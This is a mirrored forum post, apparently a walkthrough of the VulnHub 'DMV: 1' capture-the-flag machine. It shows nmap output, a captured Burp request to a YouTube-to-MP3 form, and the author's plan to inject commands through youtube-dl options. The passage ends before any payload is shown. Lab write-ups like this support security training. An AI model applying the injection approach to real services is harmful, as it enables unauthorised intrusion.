<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>(VulnHub) [DMV: 1] WriteUp ‚Äî Walkthrough - CTF - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Original WriteUp: 

VulnHub Link: DMV: 1 ~ VulnHub 
Description: 
It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can &amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="20864.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="hAUMCaeVswVHVhR74ijlHSQYH"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="hAUMCaeVswVHVhR74ijlHSQYH"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;(VulnHub) [DMV: 1] WriteUp ‚Äî Walkthrough&#39;" href="20864.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/vulnhub-dmv-1-writeup-walkthrough/20864" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/vulnhub-dmv-1-writeup-walkthrough/20864" />
<meta property="og:title" content="(VulnHub) [DMV: 1] WriteUp ‚Äî Walkthrough" />
<meta name="twitter:title" content="(VulnHub) [DMV: 1] WriteUp ‚Äî Walkthrough" />
<meta property="og:description" content="Original WriteUp:   VulnHub Link: DMV: 1 ~ VulnHub  Description:  It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root userThis works better with VirtualBox rather than VMware.  The VirtualBox IP: 192.168.56.101  So as a start and as always a quick nmap scan:   nmap -sC -sV 192.168.56.101  Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-16 16:25 GMT Daylight Time  Nmap..." />
<meta name="twitter:description" content="Original WriteUp:   VulnHub Link: DMV: 1 ~ VulnHub  Description:  It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root userThis works better with VirtualBox rather than VMware.  The VirtualBox IP: 192.168.56.101  So as a start and as always a quick nmap scan:   nmap -sC -sV 192.168.56.101  Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-16 16:25 GMT Daylight Time  Nmap..." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta property="og:article:tag" content="ctf" />
<meta property="og:article:tag" content="writeup" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="6 ‚ù§" />
<meta property="article:published_time" content="2020-04-28T14:33:45+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="20864.html">(VulnHub) [DMV: 1] WriteUp ‚Äî Walkthrough</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F1592A'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>CTF</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/ctf.html' class='discourse-tag' rel="tag">ctf</a>, 
            <a href='../../tag/writeup.html' class='discourse-tag' rel="tag">writeup</a>, 
            <a href='../../tag/hacking.html' class='discourse-tag' rel="tag">hacking</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='(VulnHub) [DMV: 1] WriteUp ‚Äî Walkthrough'>
      <link itemprop='url' href='20864.html'>
      <meta itemprop='datePublished' content='2020-04-28T14:33:44Z'>
        <meta itemprop='articleSection' content='CTF'>
      <meta itemprop='keywords' content='ctf, writeup, hacking'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/DamaneDz.html'><span itemprop='name'>DamaneDz</span></a>
                (DamaneDz)
              </span>

                <link itemprop="mainEntityOfPage" href="20864.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png">

              <span class="crawler-post-infos">
                  <time  datetime='2020-04-28T14:33:45Z' class='post-time'>
                    April 28, 2020,  2:33pm
                  </time>
                  <meta itemprop='dateModified' content='2020-04-28T14:40:59Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Original WriteUp:</p><aside class="onebox allowlistedgeneric" data-onebox-src="../../../external.html?link=https://ab2pentest.medium.com/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9">
  <header class="source">
      <img src="../../../external.html?link=https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19" class="site-icon" alt="" width="32" height="32">

      <a href="../../../external.html?link=https://ab2pentest.medium.com/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9" target="_blank" rel="noopener nofollow ugc" title="03:06PM - 09 April 2022">Medium ‚Äì 9 Apr 22</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/326;"><img src="../../../miro.medium.com/v2/resize_fit_1200/1_Y2DLWbNUwz7Hz4MZgJIZzA.png" class="thumbnail" alt="" width="690" height="326"></div>

<h3><a href="../../../external.html?link=https://ab2pentest.medium.com/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9" target="_blank" rel="noopener nofollow ugc">(VulnHub) [DMV: 1] WriteUp‚Ää‚Äî‚ÄäWalkthrough</a></h3>

  <p>VulnHub Link: https://www.vulnhub.com/entry/dmv-1,462/</p>

  <p>
    <span class="label1">Reading time: 9 min read</span>
  </p>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>VulnHub Link: <a href="../../../external.html?link=https://www.vulnhub.com/entry/dmv-1,462/" class="inline-onebox" rel="noopener nofollow ugc">DMV: 1 ~ VulnHub</a></p>
<p>Description:</p>
<p>It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root userThis works better with VirtualBox rather than VMware.</p>
<p>The VirtualBox IP: 192.168.56.101</p>
<p>So as a start and as always a quick nmap scan:</p>
<blockquote>
<p>nmap -sC -sV 192.168.56.101<br>
Starting Nmap 7.80 ( <a href="../../../external.html?link=https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org</a> ) at 2020-04-16 16:25 GMT Daylight Time<br>
Nmap scan report for 192.168.56.101<br>
Host is up (0.00022s latency).<br>
Not shown: 998 closed ports<br>
PORT STATE SERVICE VERSION<br>
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey:<br>
| 2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)<br>
| 256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)<br>
|_ 256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)<br>
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))<br>
|_http-server-header: Apache/2.4.29 (Ubuntu)<br>
|_http-title: Site doesn‚Äôt have a title (text/html; charset=UTF-8).<br>
MAC Address: 08:00:27:28:AD:53 (Oracle VirtualBox virtual NIC)<br>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at <a href="../../../external.html?link=https://nmap.org/submit/" class="inline-onebox" rel="noopener nofollow ugc">Nmap OS/Service Fingerprint and Correction Submission Page</a> .<br>
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds</p>
</blockquote>
<p>We have only 2 opened ports !</p>
<p>22 (ssh) ==&gt;OpenSSH 7.6p1</p>
<p>80 (http) ==&gt; Apache httpd 2.4.29</p>
<p>and the nmap log show us that we are in a Ubuntu server</p>
<p>Let‚Äôs see what we have on port 80 (the web page)</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png" data-download-href="/uploads/short-url/54eU1JAd3ejVEkaQhEBwjZQEmkN.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png" alt="" data-base62-sha1="54eU1JAd3ejVEkaQhEBwjZQEmkN" width="690" height="326" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1366√ó647 65.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>We have some kind of YouTube to MP3 converter !</p>
<p>let‚Äôs try to put something in the video ID and intercept the request using BurpSuite</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/2/2f288cc39874701bcac2e4b79213a8f3876f4025.png" data-download-href="/uploads/short-url/6JbjLph91aCw5NH7UIAnxpoyCTH.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/2f288cc39874701bcac2e4b79213a8f3876f4025.png" alt="" data-base62-sha1="6JbjLph91aCw5NH7UIAnxpoyCTH" width="544" height="426" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">544√ó426 41.6 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>and the sent request from burpsuite:</p>
<p>POST / HTTP/1.1<br>
Host: 192.168.56.101<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0<br>
Accept: <em>/</em><br>
Accept-Language: en-US,en;q=0.5<br>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>
X-Requested-With: XMLHttpRequest<br>
Referer: <a href="../../../external.html?link=http://192.168.56.101/" rel="noopener nofollow ugc">http://192.168.56.101/</a><br>
Content-Length: 57<br>
DNT: 1<br>
Connection: close <strong>yt_url=https%3A%2F%<a href="../../../external.html?link=https://2fwww.youtube.com/" rel="noopener nofollow ugc">2Fwww.youtube.com</a>%2Fwatch%3Fv%3D123456</strong></p>
<p>and The response was:</p>
<p>HTTP/1.1 200 OK<br>
Date: Thu, 16 Apr 2020 15:28:06 GMT<br>
Server: Apache/2.4.29 (Ubuntu)<br>
Vary: Accept-Encoding<br>
Content-Length: 392<br>
Connection: close<br>
Content-Type: text/html; charset=UTF-8{‚Äústatus‚Äù:1,‚Äúerrors‚Äù:‚ÄúWARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 123456. URL https://www.youtube.com/watch?v= <strong>123456</strong> looks truncated.\n‚Äù,‚Äúurl_orginal‚Äù:" <strong>https://www.youtube.com/watch?v=123456</strong> ‚Äú,‚Äúoutput‚Äù:‚Äù‚Äú,‚Äúresult_url‚Äù:‚Äù/tmp/downloads/5e9879861935f.mp3"}</p>
<p>So we have a post request that takes the ID we put and add it to ‚Äú<a href="../../../external.html?link=https://www.youtube.com/watch?v" class="inline-onebox" rel="noopener nofollow ugc">YouTube</a>"</p>
<p>It looks from the request ‚Äúyt_url‚Äù that we can change the YouTube URL with something else !</p>
<p>before that we have in response somehow an error ! let‚Äôs google this and see what we have</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/cb80c301577be89e527c63dc10a714ade0701490.png" data-download-href="/uploads/short-url/t2gNqEdQopSIziYwlx15RnmhD0Y.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/cb80c301577be89e527c63dc10a714ade0701490.png" alt="" data-base62-sha1="t2gNqEdQopSIziYwlx15RnmhD0Y" width="690" height="446" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">880√ó570 38.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So the website is using a python tool that allows you to convert and download youtube videos to MP3</p>
<p>and I quote from the <a href="../../../external.html?link=https://github.com/ytdl-org/youtube-dl" rel="noopener nofollow ugc">github</a> link</p>
<p>Command-line program to download videos from <a href="../../../external.html?link=https://youtube.com/" rel="noopener nofollow ugc">YouTube.com</a> and other video sites</p>
<p>before then I start anything I had to check the commands list of this program (youtube-dl)</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/564db84a25105fddde205394f9addb862feb7226.png" data-download-href="/uploads/short-url/cjtzKcMHc9DXElDEbahbF9KvHRs.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/564db84a25105fddde205394f9addb862feb7226.png" alt="" data-base62-sha1="cjtzKcMHc9DXElDEbahbF9KvHRs" width="690" height="450" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">812√ó530 20.6 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So let‚Äôs try via BurpSuite repeater to print the version info (‚Äú ‚Äî version‚Äù as shown below)</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/d/de7cbe7373185e26476a5ca5a75021d3039c1b73.png" data-download-href="/uploads/short-url/vKdgbJKtjyTKTYV0d8VnkAI66Iz.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/de7cbe7373185e26476a5ca5a75021d3039c1b73.png" alt="" data-base62-sha1="vKdgbJKtjyTKTYV0d8VnkAI66Iz" width="690" height="344" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1139√ó569 32.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So the version was printed without errors and the program is using the version 2020.03.24 ( not that old )</p>
<p>So from the commits let‚Äôs check what we have in this version and specially looking for any bugs !</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/a/a1c2cb47f1df042fb85e65634d8fbf6710bc152e.png" data-download-href="/uploads/short-url/n50dsydKlmnmuJ422cKunCbyEsC.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/a1c2cb47f1df042fb85e65634d8fbf6710bc152e.png" alt="" data-base62-sha1="n50dsydKlmnmuJ422cKunCbyEsC" width="690" height="297" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1093√ó472 27.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>And if you want to look for bugs (I mean generally in github) don‚Äôt search on commits of the current version but you have to check recent ones ‚Ä¶</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/8/8c35f8eaca1ec6975b17233a8110caa96c01dc62.png" data-download-href="/uploads/short-url/k0mtPacsCPbxEBBNO50YoEKzIga.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/8c35f8eaca1ec6975b17233a8110caa96c01dc62.png" alt="" data-base62-sha1="k0mtPacsCPbxEBBNO50YoEKzIga" width="690" height="369" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1011√ó541 33.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>As you notice we have the Mar 23,2020 and the Apr 5, 2020 and more ‚Ä¶ The last one is on Apr 11, 2020</p>
<p>You can check manually <a href="../../../external.html?link=https://github.com/ytdl-org/youtube-dl/commits/master" class="inline-onebox" rel="noopener nofollow ugc">Commits ¬∑ ytdl-org/youtube-dl ¬∑ GitHub</a></p>
<p>nothing looks suspicious just some random updates and fixes ‚Ä¶</p>
<p>(I hope everything above is clear to now !)</p>
<p>So let‚Äôs go back to the command list and see if we can somehow execute commands on system !</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/4/4e5e83b12cb7565f90745acb3e0a7b22f074df08.png" data-download-href="/uploads/short-url/bbhJOn7fuQB1TYgWj0kfrw6CqOk.png?dl=1" title="" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/4e5e83b12cb7565f90745acb3e0a7b22f074df08.png" alt="" data-base62-sha1="bbhJOn7fuQB1TYgWj0kfrw6CqOk" width="690" height="322" role="presentation"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename"></span><span class="informations">1366√ó638 50.3 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So let‚Äôs go back to our Burpsuite repeater and try this with changing the command to whoami</p>
